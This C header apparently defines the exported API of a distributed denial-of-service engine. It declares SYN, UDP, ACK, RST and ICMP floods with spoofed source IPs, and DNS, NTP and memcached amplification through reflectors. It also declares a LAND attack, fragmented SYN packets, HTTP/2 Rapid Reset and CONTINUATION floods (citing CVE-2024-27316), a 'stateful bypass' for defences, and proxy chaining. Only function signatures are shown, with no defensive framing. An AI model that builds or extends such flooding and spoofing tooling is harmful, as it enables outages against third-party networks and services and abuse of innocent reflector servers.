#pragma once

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <time.h>
#include <netinet/in.h>

#ifdef __cplusplus
extern "C" {
#endif

#if defined(__GNUC__) || defined(__clang__)
#define EXPORT __attribute__((visibility("default")))
#else
#define EXPORT
#endif

enum attack_method {
    METHOD_SYN            = 0,
    METHOD_UDP            = 1,
    METHOD_ACK            = 2,
    METHOD_RST            = 3,
    METHOD_ICMP           = 4,
    METHOD_DNS_AMP        = 5,
    METHOD_NTP_AMP        = 6,
    METHOD_H2_RAPID_RESET = 7,
    METHOD_STATEFUL_BYPASS = 8,
    METHOD_MORPH_FLOOD    = 9,
    METHOD_MAX
};

typedef struct attack_config_t {
    enum attack_method method;
    uint32_t           target_ip;
    uint16_t           target_port;
    uint32_t           spoof_ip;
    uint32_t          *spoof_pool;
    int                spoof_count;
    int                rate;
    int                duration_sec;
    int                jitter_us;
    int                burst_size;
    union {
        struct {
            uint32_t morph_ttl           : 8;
            uint32_t morph_window        : 16;
            uint32_t h2_concurrent_streams : 8;
        };
        uint32_t flags;
    };
    char interface_name[64];
} attack_config_t;

/* Lifecycle */
EXPORT int  engine_init(const attack_config_t *cfg);
EXPORT void engine_shutdown(void);

/* Control */
EXPORT int  engine_start(void);
EXPORT int  engine_stop(void);

/* Status */
EXPORT int  engine_status(int *running, uint64_t *packets_sent);

/* Packet engine */
EXPORT int  init_raw_socket(void);
EXPORT int  init_raw_socket_tid(int tid);
EXPORT int  init_udp_socket(void);
EXPORT int  is_raw_mode(void);
EXPORT void close_raw_socket(void);
EXPORT uint16_t calc_checksum(uint16_t *data, int len);
EXPORT uint32_t resolve_ip(const char *hostname);
EXPORT const char *packet_error(void);

/* Spoof pool */
EXPORT void set_spoof_pool(uint32_t *pool, int count);
EXPORT void seed_thread_rng(int tid, uint32_t seed);

/* Legacy flood functions */
EXPORT int  syn_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay);
EXPORT int  syn_flood_raw(uint32_t target, uint16_t port, uint32_t spoof, int count);
EXPORT int  udp_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay, int size);
EXPORT int  ack_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay);
EXPORT int  rst_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay);
EXPORT int  icmp_flood(uint32_t target, uint32_t spoof, int count, int delay);

/* Socket accessor (for Go bridge) */
EXPORT int get_raw_socket(void);

/* Multi-threaded batched sendmmsg flood */
EXPORT int  start_batch_flood(uint32_t target_ip, uint16_t target_port, int method, int workers, int size, int duration_sec);
EXPORT int  stop_batch_flood(void);
EXPORT uint64_t batch_flood_sent(void);

/* Amplification */
EXPORT int  dns_any_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay);
EXPORT int  memcached_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay);
EXPORT int  dns_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay);
EXPORT int  ntp_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay);

/* LAND attack */
EXPORT int  land_attack(uint32_t target, uint16_t port, int count);

/* IP fragmentation */
EXPORT int  send_fragmented_syn(uint32_t target, uint16_t port, uint32_t spoof);

/* Advanced engine */
EXPORT int      init_advanced_engine(int sock, int method);
EXPORT int      advanced_send_batch(int sock, struct sockaddr_in *dst, int count, int method);
EXPORT int      strategy_rotate(void);
EXPORT void     get_engine_stats(uint64_t *sent, uint64_t *dropped);

/* Connection tracker */
EXPORT int      tracker_init(int max_conns);
EXPORT int      tracker_syn_sent(uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port, uint32_t seq);
EXPORT int      tracker_synack_recv(uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port, uint32_t seq, uint32_t ack);
EXPORT int      tracker_established(uint32_t src_ip, uint32_t dst_ip, uint16_t src_port, uint16_t dst_port);
EXPORT int      tracker_count_active(void);
EXPORT void     tracker_cleanup(time_t timeout);

/* Amplification engine */
EXPORT int      amplification_init(int sock);
EXPORT int      build_dns_query(unsigned char *buf, int *len, uint16_t id, const char *domain);
EXPORT int      send_amplification(int sock, struct sockaddr_in *target, int amp_type, unsigned char *payload, int payload_len);

/* Proxy chain */
EXPORT int      proxy_chain_init(const char *proxy_list_file);
EXPORT int      proxy_connect(int proxy_idx, const char *target_host, int target_port);
EXPORT int      proxy_send(int proxy_fd, const unsigned char *data, int len);
EXPORT int      proxy_recv(int proxy_fd, unsigned char *buf, int max_len);
EXPORT int      proxy_next(void);
EXPORT int      proxy_count(void);
EXPORT void     proxy_cleanup(void);

/* Rate controller */
EXPORT int      rate_init(uint64_t initial_rate, uint64_t max_rate, uint64_t min_rate);
EXPORT int      rate_allow(void);
EXPORT void     rate_on_success(void);
EXPORT void     rate_on_timeout(void);
EXPORT void     rate_on_loss(void);
EXPORT uint64_t rate_get_current(void);

/* Packet fragmenter */
EXPORT int      fragment_init(int mtu);
EXPORT int      fragment_ip_packet(unsigned char *packet, int pkt_len, unsigned char **frags, int *frag_counts, uint16_t ip_id);
EXPORT void     fragment_free(unsigned char **frags, int frag_count);

/* Stats engine */
struct thread_stats {
    uint64_t sent;
    uint64_t bytes;
    uint64_t errors;
};
EXPORT int              stats_init(int num_threads);
EXPORT void             stats_record(int thread_id, uint64_t sent, uint64_t bytes, uint64_t errors);
EXPORT void             stats_snapshot(uint64_t *total_sent, uint64_t *total_bytes, uint64_t *total_errors, double *rate);
EXPORT void             stats_reset(void);
EXPORT time_t           stats_elapsed(void);
EXPORT void             stats_format_json(char *buf, int buf_size);

/* Amplification Bank */
EXPORT int  amp_bank_init(int sock, uint32_t target_ip, uint16_t target_port);
EXPORT int  amp_bank_flood(int sock, int protos, int packets);
EXPORT int  amp_bank_flood_all(int sock, int packets);
EXPORT const char *amp_bank_protocol_name(int idx);
EXPORT int  amp_bank_protocol_factor(int idx);
EXPORT int  amp_bank_count(void);
EXPORT int  amp_bank_protocol_port(int idx);

/* H2 CONTINUATION flood (CVE-2024-27316) */
EXPORT int  h2_continuation_loop(uint32_t target_ip, uint16_t target_port, uint32_t spoof_ip, int streams, int duration_sec);

/* Stateful bypass */
EXPORT int  bypass_init_handshake(uint32_t target_ip, uint16_t target_port, uint32_t spoof_ip, int use_listen, uint32_t *seq_out, uint16_t *src_port_out);
EXPORT int  bypass_send_flood(uint32_t target_ip, uint16_t target_port, uint32_t spoof_ip, uint32_t seq, uint16_t src_port, int count, int delay);
EXPORT int  bypass_session_count(void);

/* Batch C API — zero cgo overhead per packet */
EXPORT int  multi_send(uint32_t target_ip, uint16_t target_port, int method, int count);

/* H2 Rapid Reset */
EXPORT int  h2_build_settings_frame(uint8_t *buf, int max_streams);
EXPORT int  h2_build_rst_stream_frame(uint8_t *buf, uint32_t stream_id, uint32_t error_code);
EXPORT int  h2_rapid_reset_loop(uint32_t target_ip, uint16_t target_port, uint32_t spoof, int streams, int duration, int use_batch);

#ifdef __cplusplus
}
#endif
